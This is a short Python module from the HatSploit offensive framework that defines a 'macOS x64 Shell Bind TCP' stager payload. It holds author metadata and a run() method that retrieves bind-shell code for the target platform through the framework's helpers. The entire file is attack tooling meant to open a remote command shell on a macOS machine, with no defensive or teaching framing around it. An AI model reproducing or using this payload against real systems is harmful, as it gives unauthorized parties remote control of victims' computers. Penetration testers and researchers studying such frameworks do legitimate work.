#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.payload import Payload
from hatsploit.utils.payload import PayloadTools


class HatSploitPayload(Payload, PayloadTools):
    details = {
        'Category': "stager",
        'Name': "macOS x64 Shell Bind TCP",
        'Payload': "macos/x64/shell_bind_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "Shell bind TCP payload for macOS x64.",
        'Architecture': "x64",
        'Platform': "macos",
        'Rank': "high",
        'Type': "bind_tcp"
    }

    def run(self):
        return self.get_payload(
            self.details['Platform'],
            self.details['Architecture'],
            f'shell_{self.details['Type']}',
            self.handler
        )
